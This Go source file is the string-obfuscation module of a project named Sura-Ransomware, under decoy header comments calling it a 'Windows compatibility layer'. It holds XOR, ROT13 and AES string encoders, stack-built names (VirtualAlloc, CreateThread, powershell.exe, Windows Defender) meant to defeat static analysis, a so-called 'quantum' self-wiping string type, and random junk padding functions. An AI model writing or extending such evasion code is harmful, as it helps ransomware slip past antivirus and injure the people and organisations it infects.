// OBFUSCATED
// Windows compatibility layer
// System optimization routine
package strings

import (
	"Sura-Ransomware/obfuscation"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"io"
	"time"
	"unsafe"
)

// StackString builds strings on the stack character by character to avoid detection
func StackString(chars ...byte) string {
	result := make([]byte, len(chars))
	copy(result, chars)
	return string(result)
}

// XORDecrypt decrypts a string using XOR with a key
func XORDecrypt(encrypted []byte, key byte) string {
	decrypted := make([]byte, len(encrypted))
	for i := 0; i < len(encrypted); i++ {
		decrypted[i] = encrypted[i] ^ key
	}
	return string(decrypted)
}

// ROTDecrypt decrypts a ROT-N cipher
func ROTDecrypt(encrypted string, n int) string {
	decrypted := make([]byte, len(encrypted))
	for i := 0; i < len(encrypted); i++ {
		c := encrypted[i]
		if c >= 'A' && c <= 'Z' {
			decrypted[i] = 'A' + byte((int(c-'A')-n+26)%26)
		} else if c >= 'a' && c <= 'z' {
			decrypted[i] = 'a' + byte((int(c-'a')-n+26)%26)
		} else {
			decrypted[i] = c
		}
	}
	return string(decrypted)
}

// AESDecryptString decrypts an AES-encrypted string
func AESDecryptString(encrypted []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonceSize := gcm.NonceSize()
	if len(encrypted) < nonceSize {
		return "", err
	}

	nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

// AESEncryptString encrypts a string with AES-GCM
func AESEncryptString(plaintext string, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	ciphertext := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
	return ciphertext, nil
}

// MultiLayerDecrypt uses multiple decryption layers
func MultiLayerDecrypt(encrypted string) string {
	// Layer 1: Base64
	decoded, _ := base64.StdEncoding.DecodeString(encrypted)

	// Layer 2: XOR with fixed key
	xorKey := byte(0x5A)
	for i := range decoded {
		decoded[i] ^= xorKey
	}

	// Layer 3: ROT13
	return ROTDecrypt(string(decoded), 13)
}

// MultiLayerEncrypt uses multiple encryption layers
func MultiLayerEncrypt(plaintext string) string {
	// Layer 1: ROT13
	encrypted := ROTDecrypt(plaintext, 13) // ROT13 is symmetric

	// Layer 2: XOR
	xorKey := byte(0x5A)
	xored := make([]byte, len(encrypted))
	for i := range encrypted {
		xored[i] = encrypted[i] ^ xorKey
	}

	// Layer 3: Base64
	return base64.StdEncoding.EncodeToString(xored)
}

// DynamicXOR uses a key derived from position
func DynamicXOR(data []byte, seed byte) []byte {
	result := make([]byte, len(data))
	key := seed
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key
		key = (key * 31) + byte(i) // Evolving key
	}
	return result
}

// BuildStackString creates string from individual characters (anti-static analysis)
func BuildStackString(s string) string {
	// Break string into characters and rebuild
	chars := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		chars[i] = s[i]
	}
	return string(chars)
}

// ObfuscatedCriticalStrings returns commonly needed strings in obfuscated form
type ObfuscatedStrings struct{}

func (o *ObfuscatedStrings) GetKernel32() string {
	// k e r n e l 3 2 . d l l
	return StackString(0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C)
}

func (o *ObfuscatedStrings) GetNtdll() string {
	// n t d l l . d l l
	return StackString(0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C)
}

func (o *ObfuscatedStrings) GetVirtualAlloc() string {
	// V i r t u a l A l l o c
	return StackString(0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63)
}

func (o *ObfuscatedStrings) GetCreateThread() string {
	// C r e a t e T h r e a d
	return StackString(0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64)
}

func (o *ObfuscatedStrings) GetWriteFile() string {
	// W r i t e F i l e
	return StackString(0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6C, 0x65)
}

func (o *ObfuscatedStrings) GetCmdExe() string {
	// c m d . e x e
	return StackString(0x63, 0x6D, 0x64, 0x2E, 0x65, 0x78, 0x65)
}

func (o *ObfuscatedStrings) GetPowerShell() string {
	// p o w e r s h e l l . e x e
	return StackString(0x70, 0x6F, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x65, 0x78, 0x65)
}

func (o *ObfuscatedStrings) GetWindowsDefender() string {
	// W i n d o w s   D e f e n d e r
	return StackString(0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x65, 0x66, 0x65, 0x6E, 0x64, 0x65, 0x72)
}

// QUANTUM POLYMORPHIC ENCODING INTEGRATION
// Get hardware entropy for quantum keys
func getHardwareEntropy() uint64 {
	now := time.Now().UnixNano()
	var temp int
	addr := unsafe.Pointer(&temp)
	return uint64(now) ^ uint64(uintptr(addr))
}

// QuantumProtectedString - Ultra-stealthy string encoding
type QuantumProtectedString struct {
	encoded []byte
	decoded string
	loaded  bool
}

func NewQuantumString(s string) *QuantumProtectedString {
	return &QuantumProtectedString{
		encoded: obfuscation.QuantumEncode([]byte(s)),
		loaded:  false,
	}
}

func (qps *QuantumProtectedString) Get() string {
	if !qps.loaded {
		qps.decoded = string(obfuscation.QuantumDecode(qps.encoded))
		qps.loaded = true
		// Wipe encoded version
		for i := range qps.encoded {
			qps.encoded[i] = 0
		}
		qps.encoded = nil
	}
	return qps.decoded
}

func (qps *QuantumProtectedString) Wipe() {
	for i := range qps.decoded {
		qps.decoded = qps.decoded[:i] + "\x00" + qps.decoded[i+1:]
	}
	qps.decoded = ""
	qps.loaded = false
}



// Obfuscation padding
func obf_40739() {
    _ = 6912
    var _ = "es3LDuLqLKaEhniV06dCW98hhXqS9YDzaPRE4CZjWLhcgnuQPV"
}


// Obfuscation padding
func obf_47001() {
    _ = 2494
    var _ = "qYAncWa84WD9PUfy7mvws57QH7XOJHe5MtML58WsUHkX2aVDEb"
}


// Obfuscation padding
func obf_46715() {
    _ = 8535
    var _ = "nOtXck2CQOijWkE2ilEJ76r7fEqjOGKQ9NkR6nAvyjZYVdXC5A"
}


// Obfuscation padding
func obf_61608() {
    _ = 8358
    var _ = "5NwDmJpEhVutNiwVzvr5tQWUQ7JQpl93qafBKQUC0lBL7bgd1p"
}


// Obfuscation padding
func obf_18280() {
    _ = 5190
    var _ = "TXhR37oKElB0hZRRvXCtuC6tz2dGn7JRSJGsy8A3lvCuBnfUoG"
}
